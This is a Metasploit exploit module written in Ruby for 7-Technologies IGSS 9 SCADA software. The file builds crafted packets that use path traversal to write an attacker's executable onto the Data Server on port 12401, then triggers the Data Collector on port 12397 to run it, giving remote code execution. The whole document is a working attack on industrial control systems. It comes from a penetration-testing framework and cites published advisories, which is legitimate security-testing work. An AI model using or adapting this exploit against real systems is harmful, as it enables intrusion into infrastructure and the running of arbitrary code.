##
# $Id: igss9_misc.rb 12773 2011-05-30 21:06:56Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "7-Technologies IGSS 9 Data Server/Collector Packet Handling Vulnerabilities",
			'Description'    => %q{
					This module exploits multiple vulnerabilities found on IGSS 9's Data Server and
				Data Collector services.  The initial approach is first by transferring our binary
				with Write packets (opcode 0x0D) via port 12401 (igssdataserver.exe), and then send
				an EXE packet (opcode 0x0A) to port 12397 (dc.exe), which will cause dc.exe to run
				that payload with a CreateProcessA() function as a new thread.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision$",
			'Author'         =>
				[
					'Luigi Auriemma',  #Initial discovery, poc
					'sinn3r',          #Metasploit
				],
			'References'     =>
				[
					[ 'URL', 'http://aluigi.altervista.org/adv/igss_1-adv.txt' ],  #Write File packet flaw
					[ 'URL', 'http://aluigi.altervista.org/adv/igss_8-adv.txt' ],  #EXE packet flaw
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#Service packs do not have any influence on the exploit
					[ 'Windows XP', {} ],
					[ 'Windows 7', {} ],
					[ 'Windows Server 2003 / R2' , {} ],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Mar 24 2011"))
			
			register_options(
				[
					Opt::RPORT(0, false),
					OptBool.new('VERBOSE', [false, 'Enable verbose output', false]),
				], self.class)
	end

	def write_packets(data)
		pkts = []

		#Payload will be in C:\Documents and Settings\All Users\Application Data\7T\
		tmp = rand_text_alpha(1)
		filename = "#{tmp}.exe"

		data_size = data.length

		0.step(data_size, 870) do |s|
			#Each packet only contains 870 bytes of data
			chunk = data[s, 870]

			#Data size of this packet
			chunk_size = [chunk.length].pack('v')

			#Flag is set if this is our last chunk
			#Flag 0x01 will cause the server to close the connection
			flag = (chunk.length >= 870) ? "\x00" : "\x01"

			pkt  = "\x01\x00\x34\x12"
			pkt << "\x0D"                     #Opcode
			pkt << "\x00"*7
			pkt << flag                       #Flag
			pkt << "\x00\x00\x00"
			pkt << "\x02"                     #Command (Write File)
			pkt << "\x00\x00\x00"
			pkt << "../../../../#{filename}"  #Filename
			pkt << "\x00"*73
			pkt << "\x3E\x01\x01\x02"
			pkt << "\x00\x10"
			pkt << "\x00\x00"
			pkt << "\x78\x01\x08\x04"
			pkt << "\x78\x01\x08\x04"
			pkt << "\x00"*22
			pkt << chunk_size                 #Data size
			pkt << "\x00\x00"
			pkt << chunk                      #Data chunk

			#Add the total packet size to the header
			pkt_size = [pkt.length + 2].pack('v')
			pkt = pkt_size + pkt

			#Put this packet to the array
			pkts << pkt
		end

		return filename, pkts
	end

	def exe_packet(filename)
		#Original path seems to be: C:\Program Files\7T\IGSS32\V9.0\GSS
		#We'll just traverse our way back to C:\ as base
		base = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"

		pkt  = "\x00\x01"
		pkt << "\x00\x00\x00\x00\x00\x00\x00"
		pkt << "\x01"
		pkt << "\x00\x00"
		pkt << "\x0A"
		pkt << "\x00"*31
		pkt << "#{base}Documents and Settings\\All Users\\Application Data\\7T\\#{filename}\""
		pkt << "\x00"*143

		return pkt
	end

	def exploit
		#Generate payload and our Write packets
		print_status("Generating payload...")
		p = generate_payload_exe
		fname, w_packets = write_packets(p)
		w_packets_count = w_packets.length.to_s
		print_status("#{p.length.to_s} bytes of payload to transfer (#{w_packets_count} packets)")

		#Generate our EXE packet
		e_packet = exe_packet(fname)

		#Create socket to igssdataserver.exe (12401)
		connect(true, {'RPORT'=>12401})

		#Count how many packets we've sent to track progress
		counter = 1

		#Send Write packets
		print_status("Sending Write packets...")

		w_packets.each do |packet|
			if datastore['VERBOSE']
				print_status("Sending packet #{counter.to_s}/#{w_packets_count}")
				counter += 1
			end
			sock.put(packet)
			res = sock.get_once() #Wait before we do the next sock.put again
		end

		#After the 0x01 flag is set, our connection will be closed by the server.
		disconnect

		#Now to port 12397 (nc.exe)
		connect(true, {'RPORT'=>12397})

		print_status("Attempt to execute our payload...")
		sock.put(e_packet)

		#We must delay disconnect() for a bit, otherwise dc.exe won't call
		#kernel32!CreateProcessA
		select(nil, nil, nil, 1)
		disconnect
	end
end
